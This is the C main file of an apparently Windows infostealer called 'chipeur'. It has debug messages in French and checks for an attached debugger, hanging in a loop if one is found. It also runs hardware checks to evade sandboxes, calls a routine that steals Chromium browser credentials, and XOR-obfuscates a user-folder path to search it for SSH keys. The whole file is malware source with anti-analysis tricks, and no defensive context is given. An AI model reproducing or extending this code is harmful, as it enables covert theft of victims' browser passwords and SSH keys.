#include "chipeur.h"

#include <stdio.h>
#include <stdlib.h>
#include <wchar.h>
#include <windows.h>

#include "chromium.h"
#include "find_ssh_key.h"
#include "hardware_requirements.h"
#include "obfuscation.h"

int main(void) {
#ifdef DEBUG
  // Puts the console in UTF-8
  // Allows us to print non-ASCII characters for debug
  SetConsoleOutputCP(CP_UTF8);
#endif
  // Check if a debugger is attached to the process
  BOOL isDebuggerPresent = FALSE;
  HANDLE hProcess = GetCurrentProcess();

  if (CheckRemoteDebuggerPresent(hProcess, &isDebuggerPresent)) {
    if (isDebuggerPresent) {
#ifdef DEBUG
      printf("Un débogueur est détecté sur ce processus.\n");
#endif
      while (1);
    } else {
#ifdef DEBUG
      printf("Aucun débogueur n'est détecté sur ce processus.\n");
#endif
    }
  } else {
#ifdef DEBUG
    printf(
        "Erreur lors de l'appel à CheckRemoteDebuggerPresent. Code d'erreur : "
        "%lu\n",
        GetLastError());
#endif
  }

  // Stop if sandbox detected
  int return_code = check_hardware();
  if (return_code != EXIT_SUCCESS) {
#ifdef DEBUG
    fprintf(stderr, "Hardware requirements check failed. Reason: ");
    switch (return_code) {
      case EXIT_CPU_FAIL: fprintf(stderr, "CPU check failed.\n"); break;
      case EXIT_RAM_FAIL: fprintf(stderr, "RAM check failed.\n"); break;
      case EXIT_HDD_FAIL: fprintf(stderr, "HDD check failed.\n"); break;
      case EXIT_RESOLUTION_FAIL:
        fprintf(stderr, "Resolution check failed.\n");
        break;
      default: fprintf(stderr, "Unknown check failed.\n"); break;
    }
    fprintf(stderr, "Now exiting...");
#endif
    return EXIT_FAILURE;
  }

  // Actual stealing
  steal_chromium_creds();

  wchar_t users_path[] = L"\x69\x10\x76\x7f\x59\x4f\x58\x59";  // C:\Users
  XOR_STR(users_path, 8);

  find_ssh_key(users_path);
  return EXIT_SUCCESS;
}
